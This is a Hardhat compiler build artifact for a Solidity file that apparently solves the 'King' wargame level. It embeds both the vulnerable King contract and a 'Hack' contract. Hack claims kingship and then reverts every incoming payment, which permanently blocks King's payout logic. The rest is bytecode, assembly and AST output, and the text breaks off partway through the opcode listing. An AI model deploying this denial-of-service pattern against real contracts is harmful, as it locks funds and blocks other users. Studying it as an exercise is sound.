{
	"id": "7f881c7285683087a412076ed17e36c8",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.0",
	"solcLongVersion": "0.8.0+commit.c7dfd78e",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/Ch10-King.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Hack{\r\n    King target;\r\n    \r\n    constructor(address payable _target) payable {\r\n        target = King(_target);\r\n    }\r\n\r\n    function playGame() external payable {\r\n        (bool ok, )=address(target).call{value: msg.value}(\"\");\r\n        require(ok, \"not ok\");\r\n    }\r\n    \r\n    receive() external payable { \r\n        revert();\r\n    }\r\n}\r\n\r\ncontract King {\r\n\r\n  address king;\r\n  uint public prize;\r\n  address public owner;\r\n\r\n  constructor() payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value >= prize || msg.sender == owner);\r\n    payable(king).transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address) {\r\n    return king;\r\n  }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/Ch10-King.sol": {
				"Hack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address payable",
									"name": "_target",
									"type": "address"
								}
							],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "playGame",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Ch10-King.sol\":60:410  contract Hack{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Ch10-King.sol\":104:190  constructor(address payable _target) payable {\r... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/Ch10-King.sol\":174:181  _target */\n  dup1\n    /* \"contracts/Ch10-King.sol\":160:166  target */\n  0x00\n  dup1\n    /* \"contracts/Ch10-King.sol\":160:182  target = King(_target) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/Ch10-King.sol\":104:190  constructor(address payable _target) payable {\r... */\n  pop\n    /* \"contracts/Ch10-King.sol\":60:410  contract Hack{\r... */\n  jump(tag_5)\n    /* \"#utility.yul\":7:166   */\ntag_7:\n  0x00\n    /* \"#utility.yul\":103:109   */\n  dup2\n    /* \"#utility.yul\":97:110   */\n  mload\n    /* \"#utility.yul\":88:110   */\n  swap1\n  pop\n    /* \"#utility.yul\":119:160   */\n  tag_9\n    /* \"#utility.yul\":154:159   */\n  dup2\n    /* \"#utility.yul\":119:160   */\n  tag_10\n  jump\t// in\ntag_9:\n    /* \"#utility.yul\":78:166   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":172:472   */\ntag_2:\n  0x00\n    /* \"#utility.yul\":299:301   */\n  0x20\n    /* \"#utility.yul\":287:296   */\n  dup3\n    /* \"#utility.yul\":278:285   */\n  dup5\n    /* \"#utility.yul\":274:297   */\n  sub\n    /* \"#utility.yul\":270:302   */\n  slt\n    /* \"#utility.yul\":267:269   */\n  iszero\n  tag_12\n  jumpi\n    /* \"#utility.yul\":315:316   */\n  0x00\n    /* \"#utility.yul\":312:313   */\n  dup1\n    /* \"#utility.yul\":305:317   */\n  revert\n    /* \"#utility.yul\":267:269   */\ntag_12:\n    /* \"#utility.yul\":358:359   */\n  0x00\n    /* \"#utility.yul\":383:455   */\n  tag_13\n    /* \"#utility.yul\":447:454   */\n  dup5\n    /* \"#utility.yul\":438:444   */\n  dup3\n    /* \"#utility.yul\":427:436   */\n  dup6\n    /* \"#utility.yul\":423:445   */\n  add\n    /* \"#utility.yul\":383:455   */\n  tag_7\n  jump\t// in\ntag_13:\n    /* \"#utility.yul\":373:455   */\n  swap2\n  pop\n    /* \"#utility.yul\":329:465   */\n  pop\n    /* \"#utility.yul\":257:472   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":478:582   */\ntag_14:\n  0x00\n    /* \"#utility.yul\":552:576   */\n  tag_16\n    /* \"#utility.yul\":570:575   */\n  dup3\n    /* \"#utility.yul\":552:576   */\n  tag_17\n  jump\t// in\ntag_16:\n    /* \"#utility.yul\":541:576   */\n  swap1\n  pop\n    /* \"#utility.yul\":531:582   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":588:714   */\ntag_17:\n  0x00\n    /* \"#utility.yul\":665:707   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":658:663   */\n  dup3\n    /* \"#utility.yul\":654:708   */\n  and\n    /* \"#utility.yul\":643:708   */\n  swap1\n  pop\n    /* \"#utility.yul\":633:714   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":720:858   */\ntag_10:\n    /* \"#utility.yul\":801:833   */\n  tag_20\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":801:833   */\n  tag_14\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":794:799   */\n  dup2\n    /* \"#utility.yul\":791:834   */\n  eq\n    /* \"#utility.yul\":781:783   */\n  tag_21\n  jumpi\n    /* \"#utility.yul\":848:849   */\n  0x00\n    /* \"#utility.yul\":845:846   */\n  dup1\n    /* \"#utility.yul\":838:850   */\n  revert\n    /* \"#utility.yul\":781:783   */\ntag_21:\n    /* \"#utility.yul\":771:858   */\n  pop\n  jump\t// out\n    /* \"contracts/Ch10-King.sol\":60:410  contract Hack{\r... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ch10-King.sol\":60:410  contract Hack{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xaf899735\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/Ch10-King.sol\":391:399  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ch10-King.sol\":60:410  contract Hack{\r... */\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ch10-King.sol\":198:340  function playGame() external payable {\r... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n    tag_7:\n        /* \"contracts/Ch10-King.sol\":247:254  bool ok */\n      0x00\n        /* \"contracts/Ch10-King.sol\":266:272  target */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":258:278  address(target).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Ch10-King.sol\":286:295  msg.value */\n      callvalue\n        /* \"contracts/Ch10-King.sol\":258:300  address(target).call{value: msg.value}(\"\") */\n      mload(0x40)\n      tag_9\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_13\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_12)\n    tag_13:\n      0x60\n      swap2\n      pop\n    tag_12:\n      pop\n        /* \"contracts/Ch10-King.sol\":246:300  (bool ok, )=address(target).call{value: msg.value}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/Ch10-King.sol\":319:321  ok */\n      dup1\n        /* \"contracts/Ch10-King.sol\":311:332  require(ok, \"not ok\") */\n      tag_14\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_15\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_14:\n        /* \"contracts/Ch10-King.sol\":198:340  function playGame() external payable {\r... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:310   */\n    tag_18:\n      0x00\n        /* \"#utility.yul\":170:236   */\n      tag_20\n        /* \"#utility.yul\":234:235   */\n      0x06\n        /* \"#utility.yul\":229:232   */\n      dup4\n        /* \"#utility.yul\":170:236   */\n      tag_21\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":163:236   */\n      swap2\n      pop\n        /* \"#utility.yul\":266:274   */\n      0x6e6f74206f6b0000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":262:263   */\n      0x00\n        /* \"#utility.yul\":257:260   */\n      dup4\n        /* \"#utility.yul\":253:264   */\n      add\n        /* \"#utility.yul\":246:275   */\n      mstore\n        /* \"#utility.yul\":301:303   */\n      0x20\n        /* \"#utility.yul\":296:299   */\n      dup3\n        /* \"#utility.yul\":292:304   */\n      add\n        /* \"#utility.yul\":285:304   */\n      swap1\n      pop\n        /* \"#utility.yul\":153:310   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":316:613   */\n    tag_22:\n      0x00\n        /* \"#utility.yul\":496:579   */\n      tag_24\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":572:575   */\n      dup4\n        /* \"#utility.yul\":496:579   */\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":489:579   */\n      swap2\n      pop\n        /* \"#utility.yul\":605:606   */\n      0x00\n        /* \"#utility.yul\":600:603   */\n      dup3\n        /* \"#utility.yul\":596:607   */\n      add\n        /* \"#utility.yul\":589:607   */\n      swap1\n      pop\n        /* \"#utility.yul\":479:613   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":619:998   */\n    tag_10:\n      0x00\n        /* \"#utility.yul\":825:972   */\n      tag_27\n        /* \"#utility.yul\":968:971   */\n      dup3\n        /* \"#utility.yul\":825:972   */\n      tag_22\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":818:972   */\n      swap2\n      pop\n        /* \"#utility.yul\":989:992   */\n      dup2\n        /* \"#utility.yul\":982:992   */\n      swap1\n      pop\n        /* \"#utility.yul\":807:998   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1004:1423   */\n    tag_16:\n      0x00\n        /* \"#utility.yul\":1208:1210   */\n      0x20\n        /* \"#utility.yul\":1197:1206   */\n      dup3\n        /* \"#utility.yul\":1193:1211   */\n      add\n        /* \"#utility.yul\":1185:1211   */\n      swap1\n      pop\n        /* \"#utility.yul\":1257:1266   */\n      dup2\n        /* \"#utility.yul\":1251:1255   */\n      dup2\n        /* \"#utility.yul\":1247:1267   */\n      sub\n        /* \"#utility.yul\":1243:1244   */\n      0x00\n        /* \"#utility.yul\":1232:1241   */\n      dup4\n        /* \"#utility.yul\":1228:1245   */\n      add\n        /* \"#utility.yul\":1221:1268   */\n      mstore\n        /* \"#utility.yul\":1285:1416   */\n      tag_29\n        /* \"#utility.yul\":1411:1415   */\n      dup2\n        /* \"#utility.yul\":1285:1416   */\n      tag_18\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":1277:1416   */\n      swap1\n      pop\n        /* \"#utility.yul\":1175:1423   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1429:1576   */\n    tag_25:\n      0x00\n        /* \"#utility.yul\":1567:1570   */\n      dup2\n        /* \"#utility.yul\":1552:1570   */\n      swap1\n      pop\n        /* \"#utility.yul\":1542:1576   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1582:1751   */\n    tag_21:\n      0x00\n        /* \"#utility.yul\":1700:1706   */\n      dup3\n        /* \"#utility.yul\":1695:1698   */\n      dup3\n        /* \"#utility.yul\":1688:1707   */\n      mstore\n        /* \"#utility.yul\":1740:1744   */\n      0x20\n        /* \"#utility.yul\":1735:1738   */\n      dup3\n        /* \"#utility.yul\":1731:1745   */\n      add\n        /* \"#utility.yul\":1716:1745   */\n      swap1\n      pop\n        /* \"#utility.yul\":1678:1751   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c867dc7064c695a7338d6e465b15f9466d5bda66c9d30bd048736de4b773db0164736f6c63430008000033\n}\n",
						"bytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:861:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "78:88:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "88:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "103:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "97:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "97:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "88:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "154:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address_payable",
																	"nodeType": "YulIdentifier",
																	"src": "119:34:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "119:41:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "119:41:1"
														}
													]
												},
												"name": "abi_decode_t_address_payable_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "56:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "64:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "72:5:1",
														"type": ""
													}
												],
												"src": "7:159:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "257:215:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "303:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "312:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "315:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "305:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "305:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "305:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "278:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "287:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "274:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "274:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "299:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "270:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "270:32:1"
															},
															"nodeType": "YulIf",
															"src": "267:2:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "329:136:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "344:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "358:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "348:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "373:82:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "427:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "438:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "423:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "423:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "447:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_payable_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "383:39:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "383:72:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "373:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_payable_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "227:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "238:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "250:6:1",
														"type": ""
													}
												],
												"src": "172:300:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "531:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "541:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "570:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "552:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "552:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "541:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address_payable",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "513:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "523:7:1",
														"type": ""
													}
												],
												"src": "478:104:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "633:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "643:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "658:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "665:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "654:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "654:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "643:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "615:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "625:7:1",
														"type": ""
													}
												],
												"src": "588:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "771:87:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "836:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "845:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "848:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "838:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "838:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "838:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "794:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "827:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address_payable",
																					"nodeType": "YulIdentifier",
																					"src": "801:25:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "801:32:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "791:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "791:43:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "784:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "784:51:1"
															},
															"nodeType": "YulIf",
															"src": "781:2:1"
														}
													]
												},
												"name": "validator_revert_t_address_payable",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "764:5:1",
														"type": ""
													}
												],
												"src": "720:138:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_payable_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address_payable(value)\n    }\n\n    function abi_decode_tuple_t_address_payable_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_payable_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address_payable(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address_payable(value) {\n        if iszero(eq(value, cleanup_t_address_payable(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040526040516102ed3803806102ed83398181016040528101906100259190610080565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100f2565b60008151905061007a816100db565b92915050565b60006020828403121561009257600080fd5b60006100a08482850161006b565b91505092915050565b60006100b4826100bb565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6100e4816100a9565b81146100ef57600080fd5b50565b6101ec806101016000396000f3fe6080604052600436106100225760003560e01c8063af899735146100315761002c565b3661002c57600080fd5b600080fd5b61003961003b565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163460405161008290610165565b60006040518083038185875af1925050503d80600081146100bf576040519150601f19603f3d011682016040523d82523d6000602084013e6100c4565b606091505b5050905080610108576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100ff9061017a565b60405180910390fd5b50565b60006101186006836101a5565b91507f6e6f74206f6b00000000000000000000000000000000000000000000000000006000830152602082019050919050565b600061015860008361019a565b9150600082019050919050565b60006101708261014b565b9150819050919050565b600060208201905081810360008301526101938161010b565b9050919050565b600081905092915050565b60008282526020820190509291505056fea2646970667358221220c867dc7064c695a7338d6e465b15f9466d5bda66c9d30bd048736de4b773db0164736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x2ED CODESIZE SUB DUP1 PUSH2 0x2ED DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x25 SWAP2 SWAP1 PUSH2 0x80 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xF2 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x7A DUP2 PUSH2 0xDB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x92 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xA0 DUP5 DUP3 DUP6 ADD PUSH2 0x6B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xB4 DUP3 PUSH2 0xBB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE4 DUP2 PUSH2 0xA9 JUMP JUMPDEST DUP2 EQ PUSH2 0xEF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x1EC DUP1 PUSH2 0x101 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAF899735 EQ PUSH2 0x31 JUMPI PUSH2 0x2C JUMP JUMPDEST CALLDATASIZE PUSH2 0x2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x39 PUSH2 0x3B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH2 0x82 SWAP1 PUSH2 0x165 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xBF JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xC4 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x108 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFF SWAP1 PUSH2 0x17A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x118 PUSH1 0x6 DUP4 PUSH2 0x1A5 JUMP JUMPDEST SWAP2 POP PUSH32 0x6E6F74206F6B0000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x158 PUSH1 0x0 DUP4 PUSH2 0x19A JUMP JUMPDEST SWAP2 POP PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x170 DUP3 PUSH2 0x14B JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x193 DUP2 PUSH2 0x10B JUMP 